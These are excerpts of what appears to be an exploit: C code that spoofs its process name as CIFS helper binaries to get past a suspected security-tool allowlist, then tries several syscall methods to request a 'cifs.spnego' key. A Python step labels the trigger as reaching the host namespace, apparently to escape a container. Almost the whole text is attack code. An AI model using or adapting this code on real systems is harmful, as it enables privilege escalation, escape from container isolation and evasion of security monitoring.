...
#define KEYCTL_REQUEST2             14
#define KEY_SPEC_SESSION_KEYRING    (-3)

static long try_request_key(const char *desc, int method)
{
        long ret;
        sigset_t blk, old;
        ...
        if (method == 0) {
                ...
                sigprocmask(SIG_SETMASK, &blk, &old);
                errno = 0;
                ret = syscall(NR_keyctl, (long)KEYCTL_REQUEST2,
                              "cifs.spnego", desc, "",
                              (long)KEY_SPEC_SESSION_KEYRING);
                sigprocmask(SIG_SETMASK, &old, NULL);
        } else {
...
int main(int argc, char **argv)
{
        ...
        /* comm names to try — CS may allowlist these for cifs.spnego */
        const char *comms[] = {
                "mount.cifs",
                "cifs.upcall",
                "cifsd",
        ...
        const char *method_names[] = {
                "request_key(249)", "keyctl(REQUEST2)", "int 0x80"
        };

        for (int c = 0; comms[c]; c++) {
                /* spoof process name */
                prctl(PR_SET_NAME, comms[c], 0, 0, 0);

                /* fresh session keyring per identity */
                {
                        char name[64];
                        snprintf(name, sizeof(name), "s-%d-%d", getpid(), c);
                        syscall(NR_keyctl, (long)KEYCTL_JOIN_SESSION_KEYRING,
                                name, 0, 0, 0);
                }

                for (int m = 0; m < 3; m++) {
                        fprintf(stderr, "[comm=%s method=%s] pid=%d\n",
                                comms[c], method_names[m], pid);
                        ret = try_request_key(desc, m);
                        fprintf(stderr, "    rc=%ld errno=%d (%s)\n",
                                ret, errno, strerror(errno));
                        if (ret >= 0) {
                                fprintf(stderr, "[+] SUCCESS with comm=%s method=%s\n",
                                        comms[c], method_names[m]);
                                sleep(2);
                                return 0;
                        }
                }
        ...
        /* last resort: try with original comm (binary name) */
        prctl(PR_SET_NAME, "mount.cifs", 0, 0, 0);
        fprintf(stderr, "[final] one more try with comm=mount.cifs method=request_key\n");
        {
                char name[64];
                snprintf(name, sizeof(name), "s-%d-final", getpid());
                syscall(NR_keyctl, (long)KEYCTL_JOIN_SESSION_KEYRING,
                        name, 0, 0, 0);
        }
        ret = try_request_key(desc, 0);
        fprintf(stderr, "    rc=%ld errno=%d (%s)\n", ret, errno, strerror(errno));
        if (ret >= 0) { sleep(2); return 0; }
...
def main() -> None:
    ...
    try:
        ...
        step("TRIGGERING CIFS.SPNEGO (separate process, host namespace)")
